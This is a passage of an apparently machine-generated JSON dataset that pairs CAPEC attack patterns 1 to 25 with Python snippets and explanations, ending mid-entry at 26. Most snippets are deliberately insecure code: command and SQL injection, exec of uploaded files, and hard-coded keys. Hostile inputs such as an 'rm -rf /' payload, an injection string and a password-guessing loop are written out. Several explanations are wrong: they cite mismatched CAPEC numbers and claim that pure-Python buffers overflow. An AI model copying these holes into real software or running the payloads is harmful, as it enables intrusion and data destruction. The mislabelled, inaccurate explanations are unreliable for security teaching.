[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated user data\nusers = {\n    'admin': {'role': 'admin', 'data': 'Sensitive admin data'},\n    'user': {'role': 'user', 'data': 'Regular user data'}\n}\n\n# Simulated ACLs\nacls = {\n    '/admin': ['admin'],\n    '/user': ['admin', 'user']\n}\n\n@app.route('/admin')\n@app.route('/user')\ndef access_resource():\n    username = request.args.get('username')\n    if username not in users:\n        return jsonify({'error': 'User not found'}), 404\n\n    user_role = users[username]['role']\n    resource = request.path\n\n    # Check if the resource is protected by ACLs\n    if resource in acls:\n        if user_role not in acls[resource]:\n            return jsonify({'error': 'Access denied'}), 403\n    # Missing ACL for the resource\n    else:\n        return jsonify({'error': 'Resource not protected by ACLs'}), 500\n\n    return jsonify({'data': users[username]['data']})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask framework to create a simple web application that simulates access control based on user roles. The application has two endpoints, '/admin' and '/user', which are protected by Access Control Lists (ACLs). The ACLs specify which roles are allowed to access each endpoint. If a user tries to access a resource without the proper role, they receive an 'Access denied' message. If an endpoint is missing from the ACLs, the application returns an error indicating that the resource is not protected by ACLs. This demonstrates the vulnerability described in the CAPEC, where missing or improperly configured ACLs can lead to unauthorized access to sensitive functionality."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import time\n\nclass Account:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        self.failed_attempts = 0\n        self.locked_until = None\n\n    def authenticate(self, password):\n        if self.locked_until and time.time() < self.locked_until:\n            return 'Account is locked. Try again later.'\n        if password == self.password:\n            self.failed_attempts = 0\n            return 'Authentication successful.'\n        else:\n            self.failed_attempts += 1\n            if self.failed_attempts >= 3:\n                self.locked_until = time.time() + 60  # Lock account for 60 seconds\n                return 'Account locked due to too many failed attempts.'\n            return 'Authentication failed.'\n\n# Example usage\naccount = Account('user1', 'securepassword')\nprint(account.authenticate('wrongpassword'))  # Failed attempt 1\nprint(account.authenticate('wrongpassword'))  # Failed attempt 2\nprint(account.authenticate('wrongpassword'))  # Failed attempt 3, account locked\nprint(account.authenticate('securepassword'))  # Account is locked\n",
        "description": "This Python code snippet demonstrates an overly restrictive account lockout mechanism, which is the main idea of the CAPEC 'Inducing Account Lockout'. The `Account` class has an `authenticate` method that locks the account for 60 seconds after three consecutive failed login attempts. This mechanism can be exploited by an attacker to lock out legitimate users by repeatedly attempting to log in with incorrect passwords. The code also highlights related weaknesses such as 'Overly Restrictive Account Lockout Mechanism' (CWE-645) and 'Improper Restriction of Excessive Authentication Attempts' (CWE-307)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import re\n\ndef validate_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]+$', user_input):\n        return False\n    \n    # Canonicalization step\n    canonical_input = user_input.lstrip('\\u200B\\u200C\\u200D')  # Stripping leading ghost characters\n    \n    # Further processing assuming input is now safe\n    return canonical_input\n\n# Example usage\nuser_input = '\\u200B\\u200C\\u200Dadmin'\nvalidated_input = validate_input(user_input)\nprint(f'Validated Input: {validated_input}')",
        "description": "This Python code snippet demonstrates a vulnerability where input validation is performed before canonicalization, which can be exploited using leading 'ghost' characters. The `validate_input` function first checks if the input matches a pattern of alphanumeric characters. However, it does this before stripping leading 'ghost' characters (like Zero Width Space, Zero Width Non-Joiner, and Zero Width Joiner). An attacker can bypass the validation by including these characters, which are removed only after the validation step. This embodies the main idea of the CAPEC by showing how improper handling of alternate encodings and incorrect behavior order can lead to security weaknesses."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import socket\n\n# Function to check if an IP address is allowed\nallowed_ips = ['192.168.1.1', '10.0.0.1']\n\ndef is_ip_allowed(ip):\n    return ip in allowed_ips\n\n# Function to handle incoming connection\n\ndef handle_connection(ip):\n    # Check if the IP is allowed\n    if is_ip_allowed(ip):\n        print(f'Connection from {ip} is allowed.')\n    else:\n        print(f'Connection from {ip} is denied.')\n\n# Example usage\nincoming_ip = '0xc0a80101'  # Hexadecimal representation of 192.168.1.1\n\n# Convert the incoming IP to standard dotted-decimal format\ntry:\n    decoded_ip = socket.inet_ntoa(bytes.fromhex(incoming_ip[2:]))\nexcept ValueError:\n    decoded_ip = incoming_ip  # Fallback to original if conversion fails\n\nhandle_connection(decoded_ip)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Using Alternative IP Address Encodings' (CAPEC-273). The code checks if an incoming IP address is allowed by comparing it against a list of allowed IPs. However, the incoming IP is provided in an alternative encoding (hexadecimal in this case). The code attempts to convert the hexadecimal IP to a standard dotted-decimal format before checking if it is allowed. If the conversion fails, it falls back to the original input. This approach can be exploited if the application does not properly handle or validate alternative encodings, allowing an adversary to bypass access control checks. The code also touches on related CWEs, such as reliance on IP addresses for authentication (CWE-291) and improper handling of alternate encodings (CWE-173)."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import socket\n\n# Simulate a vulnerable communication channel\nclass VulnerableCommChannel:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.sock.connect((self.host, self.port))\n        print('Connected to server')\n\n    def send_tone(self, tone):\n        # Simulate sending a tone to impersonate a supervisor signal\n        self.sock.sendall(tone.encode('utf-8'))\n        print(f'Sent tone: {tone}')\n\n    def receive_response(self):\n        response = self.sock.recv(1024)\n        print(f'Received response: {response.decode('utf-8')}')\n\n# Example usage\nif __name__ == '__main__':\n    channel = VulnerableCommChannel('127.0.0.1', 12345)\n    channel.connect()\n    channel.send_tone('2600Hz')  # Blue box tone\n    channel.receive_response()",
        "description": "This Python code snippet simulates a vulnerable communication channel that can be exploited using a Blue Boxing attack. The `VulnerableCommChannel` class establishes a connection to a server and sends a tone (e.g., '2600Hz') to impersonate a supervisor signal, which is a key aspect of the Blue Boxing attack. The code does not perform proper authorization checks (CWE-285), does not ensure communication with the correct endpoint (CWE-923), and does not verify the source of the communication channel (CWE-940). This makes it susceptible to attacks where an adversary can reroute or usurp command of the line by sending specific tones."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n    command = f'ls {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)\n",
        "description": "This Python code snippet demonstrates an Argument Injection vulnerability, specifically an OS Command Injection (CWE-78). The function `execute_command` takes user input and constructs an OS command without proper validation or neutralization of special elements. This allows an attacker to inject malicious commands. For example, if the user inputs `; rm -rf /`, it would execute `ls ; rm -rf /`, potentially causing severe damage. This snippet highlights the importance of validating and sanitizing user inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import sqlite3\n\n# Connect to the database\ndef connect_db():\n    return sqlite3.connect('example.db')\n\n# Function to execute a query with user input\ndef execute_query(user_input):\n    conn = connect_db()\n    cursor = conn.cursor()\n    # Vulnerable SQL query\n    query = f\"SELECT * FROM users WHERE username = '{user_input}'\"\n    cursor.execute(query)\n    result = cursor.fetchall()\n    conn.close()\n    return result\n\n# Example usage\nuser_input = \"' OR '1'='1\"  # This input is crafted to exploit SQL Injection\nprint(execute_query(user_input))",
        "description": "This Python code snippet demonstrates a Blind SQL Injection vulnerability. The `execute_query` function constructs an SQL query using user input without proper sanitization or validation, making it susceptible to SQL Injection attacks. The user input `\"' OR '1'='1\"` is designed to manipulate the SQL query to always return true, potentially exposing sensitive data. This example highlights the importance of proper input validation and neutralization to prevent SQL Injection vulnerabilities."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import ctypes\n\n# Vulnerable shared library\nlib = ctypes.CDLL('./vulnerable_lib.so')\n\n# Function prototype: void vulnerable_function(char *input)\nlib.vulnerable_function.argtypes = [ctypes.c_char_p]\n\n# Input that causes buffer overflow\ninput_data = b'A' * 1024  # Assuming the buffer in the library is smaller than 1024 bytes\n\n# Call the vulnerable function\nlib.vulnerable_function(input_data)",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability in an API call to a shared library. The code uses the `ctypes` module to load a shared library (`vulnerable_lib.so`) and calls a function (`vulnerable_function`) that is vulnerable to buffer overflow. The input data (`input_data`) is a byte string that exceeds the expected buffer size in the library, leading to a buffer overflow. This example embodies the main idea of the CAPEC by showing how an adversary can exploit a known vulnerable library, affecting all clients that use it. The related CWEs are represented by the lack of input size validation (CWE-120), improper restriction of memory operations (CWE-119), and potential integer overflow (CWE-680) if the buffer size calculation is incorrect."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    buffer = bytearray(64)\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]\n    return buffer\n\nif __name__ == '__main__':\n    user_input = input('Enter your input: ').encode('utf-8')\n    result = vulnerable_function(user_input)\n    print('Buffer content:', result)\n    os.system(result.decode('utf-8', errors='ignore'))",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability in a command-line utility, which aligns with the CAPEC description. The `vulnerable_function` takes user input and copies it into a fixed-size buffer without checking if the input exceeds the buffer's size, leading to a classic buffer overflow (CWE-120). The code also includes improper input validation (CWE-20) as it does not validate the length of the user input. Additionally, the use of `os.system` with user input can lead to command injection (CWE-74). This snippet represents the main idea of the CAPEC by showing how an adversary could exploit these weaknesses to execute arbitrary commands, potentially escalating privileges."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import os\n\ndef vulnerable_function():\n    buffer = bytearray(64)  # Fixed buffer size\n    env_var = os.getenv('VULNERABLE_ENV_VAR')  # Get environment variable\n    if env_var:\n        buffer[:len(env_var)] = env_var.encode('utf-8')  # Copy environment variable to buffer without size check\n    print(buffer)\n\nif __name__ == '__main__':\n    vulnerable_function()",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability via environment variables. The function `vulnerable_function` retrieves the value of an environment variable 'VULNERABLE_ENV_VAR' and copies it into a fixed-size buffer without checking if the environment variable's length exceeds the buffer's capacity. This can lead to a buffer overflow if the environment variable's value is longer than the buffer size. The code embodies the main idea of CAPEC-14 (Buffer Overflow via Environment Variables) and highlights CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/files/<filename>')\ndef serve_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask framework to create a simple web application that allows file uploads and serves files from a specified directory. The main idea of the CAPEC is represented by the potential for misclassification of files based on their names or extensions. The code does not perform any validation or sanitization on the uploaded file's name or extension, which can lead to several vulnerabilities described by the related CWEs. For example, an attacker could upload a file with a dangerous extension or name, causing the server to handle it in an unexpected way (CWE-646). Additionally, the code does not restrict the names of the files being served, which could lead to improper access to sensitive files (CWE-641)."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import socket\n\n# Simulate a multicast receiver\nclass MulticastReceiver:\n    def __init__(self, multicast_group, port):\n        self.multicast_group = multicast_group\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind(('', self.port))\n\n    def receive_message(self):\n        while True:\n            data, addr = self.sock.recvfrom(1024)\n            message = data.decode('utf-8')\n            print(f'Received message: {message} from {addr}')\n            # Vulnerable: No authentication or integrity check\n            if 'privileged' in message:\n                self.handle_privileged_message(message)\n\n    def handle_privileged_message(self, message):\n        # Vulnerable: Incorrect handling of security identifiers\n        if 'ID=admin' in message:\n            print('Handling privileged message as admin')\n        else:\n            print('Handling privileged message as regular user')\n\n# Example usage\nreceiver = MulticastReceiver('224.0.0.1', 5004)\nreceiver.receive_message()",
        "description": "This Python code snippet simulates a multicast receiver that listens for messages on a specified multicast group and port. The receiver processes incoming messages and checks for the presence of the word 'privileged' to handle them differently. The code is vulnerable because it does not perform any authentication or integrity checks on the received messages (CWE-306, CWE-924). Additionally, it incorrectly handles security identifiers by simply checking for the presence of 'ID=admin' in the message (CWE-1292, CWE-1290). This can allow an attacker to impersonate a privileged user by crafting a message with 'ID=admin', thereby gaining unauthorized access to privileged information or functions. The code embodies the main idea of the CAPEC by demonstrating how an attacker can choose and manipulate message identifiers to gain unauthorized access."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import os\n\ndef authenticate_user():\n    # CWE-302: Authentication Bypass by Assumed-Immutable Data\n    user = os.getenv('USER')\n    if user == 'admin':\n        return True\n    return False\n\n# CWE-15: External Control of System or Configuration Setting\n# CWE-73: External Control of File Name or Path\n# CWE-20: Improper Input Validation\n# CWE-74: Injection\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-353: Missing Support for Integrity Check\n\ndef read_config_file():\n    config_path = os.getenv('CONFIG_PATH')\n    with open(config_path, 'r') as file:\n        return file.read()\n\nif authenticate_user():\n    config_data = read_config_file()\n    print(config_data)\nelse:\n    print('Access Denied')",
        "description": "This Python code snippet demonstrates a scenario where environment variables are subverted to manipulate the behavior of a program. The `authenticate_user` function checks the 'USER' environment variable to determine if the user is 'admin', which is an example of CWE-302 (Authentication Bypass by Assumed-Immutable Data). The `read_config_file` function reads a configuration file path from the 'CONFIG_PATH' environment variable, which can be influenced externally (CWE-15 and CWE-73). The code does not validate the input (CWE-20), potentially allowing for injection attacks (CWE-74) and exposure of sensitive information (CWE-200). Additionally, there is no integrity check for the data being read (CWE-353). This code illustrates how manipulating environment variables can lead to various security vulnerabilities, aligning with the CAPEC description of subverting environment variable values."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import socket\n\n# Hostile service that sends malicious content\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\nprint('Hostile service running on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    # Malicious payload that causes buffer overflow\n    malicious_payload = 'A' * 1024  # CWE-120: Buffer Copy without Checking Size of Input\n    client_socket.send(malicious_payload.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a hostile service that sends a malicious payload to a client, exploiting a buffer overflow vulnerability (CWE-120). The server listens on port 8080 and sends a payload of 1024 'A' characters to any connecting client. This payload is designed to overflow the buffer in the client software, demonstrating the concept of a client-side injection-induced buffer overflow as described in the CAPEC. The code does not include any integrity checks (CWE-353) or input validation (CWE-20), making it a simple yet effective example of the described attack."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection due to improper neutralization of special elements\n    command = f'ls {user_input}'\n    os.system(command)\n\n# Example of user input that could exploit the vulnerability\nuser_input = '&& echo hacked'\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a vulnerability to command injection attacks, which is the main idea of the CAPEC 'Command Delimiters'. The function `execute_command` takes user input and concatenates it into a shell command without proper neutralization of special elements. This allows an attacker to inject additional commands using delimiters like '&&'. For example, the input '&& echo hacked' will execute the 'ls' command followed by 'echo hacked', demonstrating how an attacker can exploit this vulnerability. This snippet embodies CWE-77 (Improper Neutralization of Special Elements used in a Command) and CWE-78 (Improper Neutralization of Special Elements used in an OS Command)."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import itertools\n\n# Dictionary of common passwords\ncommon_passwords = ['password', '123456', '123456789', 'qwerty', 'abc123', 'password1']\n\n# Simulated user database with weak password requirements\nuser_db = {'user1': 'password', 'user2': '123456', 'user3': 'qwerty'}\n\n# Function to simulate login attempt\ndef login(username, password):\n    if username in user_db and user_db[username] == password:\n        return True\n    return False\n\n# Dictionary-based password attack\nfor username, _ in user_db.items():\n    for password in common_passwords:\n        if login(username, password):\n            print(f\"Login successful for {username} with password: {password}\")\n            break\n        else:\n            print(f\"Login failed for {username} with password: {password}\")",
        "description": "This Python code snippet demonstrates a dictionary-based password attack. It uses a list of common passwords to attempt to log in to a simulated user database with weak password requirements. The `login` function checks if the provided username and password match any entry in the user database. The attack iterates over each username and tries each password from the common passwords list. If a match is found, it prints a success message; otherwise, it prints a failure message. This code highlights the vulnerability of systems with weak password requirements and the absence of mechanisms to prevent excessive authentication attempts, making them susceptible to dictionary-based password attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/execute/<filename>', methods=['GET'])\ndef execute_file(filename):\n    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    if not os.path.exists(file_path):\n        return 'File not found', 404\n    os.system(f'chmod +x {file_path}')\n    os.system(file_path)\n    return 'File executed', 200\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using the Flask framework. The application allows users to upload files and then execute them. The main idea of the CAPEC 'Using Malicious Files' is embodied here, as the code allows an adversary to upload a file and then execute it. The code snippet also demonstrates several related CWEs:\n\n1. CWE-732 (Incorrect Permission Assignment for Critical Resource): The code sets executable permissions on the uploaded file without proper validation.\n2. CWE-285 (Improper Authorization): There is no authorization check to ensure that only authorized users can upload or execute files.\n3. CWE-272 (Least Privilege Violation): The code does not drop elevated privileges after setting executable permissions.\n4. CWE-59 (Improper Link Resolution Before File Access): The code does not check if the filename is a link or shortcut that resolves to an unintended resource.\n5. CWE-282 (Improper Ownership Management): The code does not verify the ownership of the uploaded file.\n6. CWE-270 (Privilege Context Switching Error): The code does not properly manage privileges while switching contexts.\n7. CWE-693 (Protection Mechanism Failure): The code lacks sufficient protection mechanisms to defend against directed attacks.\n\nOverall, this code snippet is a concise representation of the vulnerabilities described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display_image', methods=['GET'])\ndef display_image():\n    # Vulnerable code: directly embedding user input in an IMG tag\n    img_url = request.args.get('img_url', '')\n    html_content = f'<img src=\"{img_url}\" alt=\"User Image\">'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using the Flask framework. The application has a route '/display_image' that takes a user-provided 'img_url' parameter and embeds it directly into an HTML IMG tag without proper sanitization. This can lead to an XSS attack if an attacker provides a malicious script within the 'img_url' parameter. For example, an attacker could provide a URL like 'javascript:alert(1)' which would execute a script instead of displaying an image. This snippet embodies the main idea of the CAPEC 'XSS Targeting Non-Script Elements' by showing how improper neutralization of script-related HTML tags (CWE-80) and attributes of IMG tags (CWE-82) can lead to XSS vulnerabilities."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-506: Embedded Malicious Code\n# CWE-79: Cross-site Scripting (XSS)\n# CWE-830: Inclusion of Web Functionality from an Untrusted Source\n\n# Simulate a function that executes a script from an untrusted source\n# This function is vulnerable to script embedding attacks\n\ndef execute_script(script_path):\n    if not os.path.exists(script_path):\n        raise FileNotFoundError(f\"Script {script_path} not found.\")\n\n    with open(script_path, 'r') as file:\n        script_content = file.read()\n\n    # CWE-284: No proper access control, any script can be executed\n    exec(script_content)  # CWE-506: Potentially executing malicious code\n\n# Example of a script that could be embedded within another script\nmalicious_script = \"print('This is a malicious script')\"\n\n# Write the malicious script to a file\nwith open('malicious_script.py', 'w') as file:\n    file.write(malicious_script)\n\n# Execute the malicious script\nexecute_script('malicious_script.py')\n",
        "description": "This Python code snippet demonstrates a vulnerability where an adversary can embed a malicious script within another script that the target software executes. The `execute_script` function reads and executes a script from a given file path without proper access control (CWE-284). This can lead to the execution of malicious code (CWE-506). The example shows how a malicious script can be written to a file and then executed, highlighting the risk of embedding scripts within scripts. This scenario also touches on the risks of including web functionality from untrusted sources (CWE-830) and improper neutralization of input (CWE-79), although these are not explicitly shown in the code."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import hashlib\nfrom Crypto.Cipher import AES\n\n# Hard-coded cryptographic key (CWE-321)\nkey = b'hardcodedkey1234'\n\n# Weak IV generation (CWE-1204)\niv = b'0000000000000000'\n\n# Example plaintext\nplaintext = b'Sensitive Data'\n\n# Encrypting the plaintext using AES (CWE-327)\ncipher = AES.new(key, AES.MODE_CBC, iv)\nciphertext = cipher.encrypt(plaintext.ljust(16))\n\nprint(f'Ciphertext: {ciphertext.hex()}')\n\n# Brute force attack simulation\nfor i in range(256**2):\n    test_key = hashlib.md5(str(i).encode()).digest()[:16]\n    test_cipher = AES.new(test_key, AES.MODE_CBC, iv)\n    try:\n        decrypted = test_cipher.decrypt(ciphertext).strip()\n        if decrypted == plaintext:\n            print(f'Key found: {test_key}')\n            break\n    except:\n        continue",
        "description": "This Python code snippet demonstrates a vulnerable encryption implementation that can be exploited using brute force. The code uses a hard-coded cryptographic key (CWE-321) and a weak initialization vector (IV) (CWE-1204) to encrypt sensitive data using the AES algorithm in CBC mode (CWE-327). The ciphertext is then subjected to a brute force attack, where the attacker tries different keys to decrypt the ciphertext and retrieve the original plaintext. This illustrates the concept of 'Encryption Brute Forcing' (CAPEC) and highlights the risks associated with inadequate encryption strength and poor cryptographic practices."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.md5(username.encode()).hexdigest()  # CWE-6: Insufficient Session-ID Length\n        sessions[session_id] = username\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id, httponly=True)  # CWE-539: Persistent Cookies with Sensitive Info\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/profile')\ndef profile():\n    session_id = request.cookies.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'  # CWE-290: Authentication Bypass by Spoofing\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple web application using Flask that is vulnerable to the 'Exploitation of Trusted Identifiers' attack pattern. The application has a login route that sets a session ID as a cookie upon successful authentication. The session ID is generated using an MD5 hash of the username, which is an example of CWE-6 (Insufficient Session-ID Length). The session ID is stored in a persistent cookie (CWE-539), and the profile route uses this session ID to authenticate the user. This setup is vulnerable to session hijacking and spoofing attacks (CWE-290) because the session ID is predictable and not invalidated properly. The code demonstrates how an attacker could exploit trusted identifiers to perform unauthorized actions under the guise of an authenticated user."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} accepted')\n    data = client_socket.recv(1024).decode('utf-8')\n    if data == 'valid_client':\n        client_socket.send('Access granted'.encode('utf-8'))\n    else:\n        client_socket.send('Access denied'.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that accepts client connections and grants access based on a simple string comparison. The server does not properly authenticate the client, making it susceptible to spoofing attacks (CWE-290, CWE-287). Additionally, the server does not validate the input data properly (CWE-20), and it exposes sensitive information (access status) to potentially unauthorized actors (CWE-200). The lack of robust protection mechanisms (CWE-693) makes the server vulnerable to exploitation by an attacker who can easily impersonate a valid client."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import os\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-20: Improper Input Validation\n\ndef upload_file(file_path):\n    # CWE-646: Relying on file extension to determine file type\n    if file_path.endswith('.txt'):\n        with open(file_path, 'r') as file:\n            content = file.read()\n            # CWE-20: No validation of file content\n            process_file(content)\n    else:\n        print('Unsupported file type')\n\n# CWE-506: Embedded Malicious Code\n# CWE-433: Unparsed Raw Web Content Delivery\n# Simulating a function that processes the file content\n# This function could be exploited if the content is malicious\n\ndef process_file(content):\n    exec(content)  # Dangerous: executing raw content without validation\n\n# Simulating an upload of a malicious file\nmalicious_file_path = 'malicious_payload.txt'\nwith open(malicious_file_path, 'w') as f:\n    f.write('os.system(\"rm -rf /\")')  # Malicious payload\n\nupload_file(malicious_file_path)",
        "description": "This Python code snippet demonstrates a vulnerable file upload and processing mechanism. The `upload_file` function checks the file extension to determine if it should process the file, which is a reliance on the file name or extension (CWE-646). It then reads the file content without any validation (CWE-20) and passes it to the `process_file` function. The `process_file` function executes the file content directly using `exec`, which is highly dangerous as it can execute malicious code (CWE-506). The code also simulates the upload of a malicious file containing a payload that deletes the root directory, demonstrating the potential impact of such vulnerabilities. This snippet embodies the main idea of CAPEC-152: File Content Injection, where an adversary can inject malicious content into files that are then processed by the system, leading to potential exploitation."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "def vulnerable_filter(input_string):\n    buffer = [''] * 10  # Fixed-size buffer\n    for i in range(len(input_string)):\n        buffer[i] = input_string[i]  # No bounds checking\n    return ''.join(buffer)\n\n# Example usage\nuser_input = 'A' * 20  # Overly long input string\nresult = vulnerable_filter(user_input)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerable filter function that attempts to copy an input string into a fixed-size buffer without performing proper bounds checking. The buffer is defined with a fixed size of 10 elements, but the function does not verify if the input string's length exceeds this size. This can lead to a buffer overflow, as the loop iterates over the entire length of the input string, potentially writing outside the bounds of the buffer. This embodies the main idea of the CAPEC 'Filter Failure through Buffer Overflow' by showing how an oversized transaction can cause a filter to fail. The related CWEs are represented as follows: CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "import threading\n\n# Shared resource\nshared_resource = 0\n\n# Locks\nlock1 = threading.Lock()\nlock2 = threading.Lock()\n\n# Thread 1 function\ndef thread1_routine():\n    global shared_resource\n    with lock1:\n        print('Thread 1 acquired lock1')\n        with lock2:\n            print('Thread 1 acquired lock2')\n            shared_resource += 1\n            print('Thread 1 incremented shared_resource')\n\n# Thread 2 function\ndef thread2_routine():\n    global shared_resource\n    with lock2:\n        print('Thread 2 acquired lock2')\n        with lock1:\n            print('Thread 2 acquired lock1')\n            shared_resource += 1\n            print('Thread 2 incremented shared_resource')\n\n# Create threads\nthread1 = threading.Thread(target=thread1_routine)\nthread2 = threading.Thread(target=thread2_routine)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Join threads\nthread1.join()\nthread2.join()\n\nprint('Final value of shared_resource:', shared_resource)",
        "description": "This Python code snippet demonstrates a forced deadlock scenario using threading and locks. Two threads, `thread1` and `thread2`, attempt to acquire two locks (`lock1` and `lock2`) in different orders. `thread1` acquires `lock1` first and then tries to acquire `lock2`, while `thread2` acquires `lock2` first and then tries to acquire `lock1`. This can lead to a deadlock where both threads are waiting for each other to release the locks they need, causing a denial of service. This example embodies the main idea of the CAPEC 'Forced Deadlock' and illustrates related CWEs such as 'Improper Synchronization' (CWE-662), 'Improper Locking' (CWE-667), and 'Deadlock' (CWE-833)."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
